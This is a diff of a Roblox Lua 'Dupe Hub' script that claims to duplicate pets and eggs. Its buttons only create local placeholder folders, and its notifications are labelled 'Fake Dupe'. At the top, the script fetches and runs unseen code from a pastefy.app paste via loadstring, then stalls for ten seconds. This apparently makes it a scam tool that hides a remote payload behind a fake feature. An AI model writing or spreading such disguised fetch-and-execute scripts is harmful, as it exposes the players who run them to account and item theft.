@@ -3,100 +3,94 @@ loadstring(game:HttpGet("https://pastefy.app/dM5jzdFf/raw"))()
 local t = tick() + 10
 while tick() < t do end
 
--- Dupe Pet & Egg Hub
--- Made by vdawngg
+-- Dupe Hub (Made by vdawngg)
 
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+local W = Rayfield:CreateWindow({
+   Name="Dupe Hub",
+   LoadingTitle="Loading...",
+   LoadingSubtitle="Made by vdawngg",
+   KeySystem=false
+})
+local T = W:CreateTab("Dupe")
 
-local Window = Rayfield:CreateWindow({
-   Name = "Dupe Hub",
-   LoadingTitle = "Loading...",
-   LoadingSubtitle = "Made by vdawngg",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "DupeHubConfig",
-      FileName = "Config"
-   },
-   KeySystem = false,
+local SelectedPet, SelectedEgg, SelectedMutation, Amount = "", "", "", 1
+
+-- Danh sách tất cả Pet (gốc)
+local petList = {
+   "Dragonfly","Raccoon","T-rex","Queen bee","Butterfly","Spinosaurus",
+   "Kitsune","Corrupted Kitsune","Disco bee","Moon cat","Mimic","Thermidor",
+   "Axolotl","Phoenix","Shark","Unicorn","Tiger","Lion","Frog","Snake",
+   "Wolf","Panda","Dog","Cat","Fox","Bat","Penguin","Slime","Golem",
+   "Ghoul","Reaper","Cactus","Snowman","Ghost","Hydra","Kraken","Dinosaur",
+   "Cyborg","Alien","Robot","Octopus","Jellyfish","Dodo","Whale","Lizard",
+   "Crocodile","Rabbit","Deer","Elephant","Monkey","Cow","Sheep","Chicken",
+   "Goat","Pig"
+}
+
+-- Danh sách Egg
+local eggList = {
+   "Magic Egg","Golden Egg","Basic Egg","Shiny Egg",
+   "Frozen Egg","Rainbow Egg","Ancient Egg","Mystic Egg"
+}
+
+-- Danh sách Mutation
+local mutationList = {
+   "Shiny","Inverted","Frozen","Golden","Tiny","Ironskin",
+   "Shocked","Rainbow","Radiant","Ascended","Tranquil","Corrupt","Fried"
+}
+
+-- Dropdown chọn Pet
+T:CreateDropdown({
+   Name="Select Pet",
+   Options=petList,
+   CurrentOption="None",
+   Callback=function(v) SelectedPet=v end
 })
 
--- Tab chính
-local dupeTab = Window:CreateTab("Dupe", 4483362458)
-
-dupeTab:CreateSection("Fake Dupe System")
-
--- Biến lưu
-getgenv().SelectedPet = nil
-getgenv().SelectedEgg = nil
-getgenv().DupeCount = 1
-
--- Chọn Pet
-dupeTab:CreateDropdown({
-   Name = "Choose Pet",
-   Options = {"Dragonfly", "Raccoon", "T-rex", "Queen bee", "Butterfly", "Spinosaurus"},
-   CurrentOption = "None",
-   Callback = function(Value)
-      getgenv().SelectedPet = Value
-   end,
+-- Dropdown chọn Egg
+T:CreateDropdown({
+   Name="Select Egg",
+   Options=eggList,
+   CurrentOption="None",
+   Callback=function(v) SelectedEgg=v end
 })
 
--- Chọn Egg
-dupeTab:CreateDropdown({
-   Name = "Choose Egg",
-   Options = {"Magic Egg", "Golden Egg", "Basic Egg", "Shiny Egg"},
-   CurrentOption = "None",
-   Callback = function(Value)
-      getgenv().SelectedEgg = Value
-   end,
+-- Dropdown chọn Mutation
+T:CreateDropdown({
+   Name="Select Mutation",
+   Options=mutationList,
+   CurrentOption="None",
+   Callback=function(v) SelectedMutation=v end
 })
 
 -- Input số lượng
-dupeTab:CreateInput({
-   Name = "Dupe Amount",
-   PlaceholderText = "Enter number (default 1)",
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-      local num = tonumber(Text)
-      if num and num > 0 then
-         getgenv().DupeCount = num
-      else
-         getgenv().DupeCount = 1
-      end
-   end,
+T:CreateInput({
+   Name="Amount",
+   PlaceholderText="Enter number",
+   Callback=function(t) Amount=tonumber(t) or 1 end
 })
 
--- Nút dupe Pet
-dupeTab:CreateButton({
-   Name = "Dupe Selected Pet",
-   Callback = function()
-      local Backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
-      for i = 1, getgenv().DupeCount do
-         local fakePet = Instance.new("Folder")
-         fakePet.Name = (getgenv().SelectedPet or "Pet") .. "_Clone" .. i
-         fakePet.Parent = Backpack
+-- Nút Dupe
+T:CreateButton({
+   Name="Dupe Now",
+   Callback=function()
+      local B=game.Players.LocalPlayer.Backpack
+      for i=1,Amount do
+         if SelectedPet~="" then
+            local pet=Instance.new("Folder",B)
+            pet.Name=(SelectedMutation~="" and SelectedMutation.." " or "")..SelectedPet.."_Clone"..i
+         end
+         if SelectedEgg~="" then
+            local egg=Instance.new("Folder",B)
+            egg.Name=(SelectedMutation~="" and SelectedMutation.." " or "")..SelectedEgg.."_Clone"..i
+         end
       end
       Rayfield:Notify({
-         Title = "Fake Dupe",
-         Content = "Created " .. getgenv().DupeCount .. "x " .. (getgenv().SelectedPet or "Pet"),
-         Duration = 5,
+         Title="Fake Dupe",
+         Content="Cloned "..Amount.."x "..(SelectedMutation~="" and SelectedMutation.." " or "")..(SelectedPet~="" and SelectedPet or SelectedEgg),
+         Duration=5
       })
-   end,
+   end
 })
 
--- Nút dupe Egg
-dupeTab:CreateButton({
-   Name = "Dupe Selected Egg",
-   Callback = function()
-      local Backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
-      for i = 1, getgenv().DupeCount do
-         local fakeEgg = Instance.new("Folder")
-         fakeEgg.Name = (getgenv().SelectedEgg or "Egg") .. "_Clone" .. i
-         fakeEgg.Parent = Backpack
-      end
-      Rayfield:Notify({
-         Title = "Fake Dupe",
-         Content = "Created " .. getgenv().DupeCount .. "x " .. (getgenv().SelectedEgg or "Egg"),
-         Duration = 5,
-      })
-   end,
-})
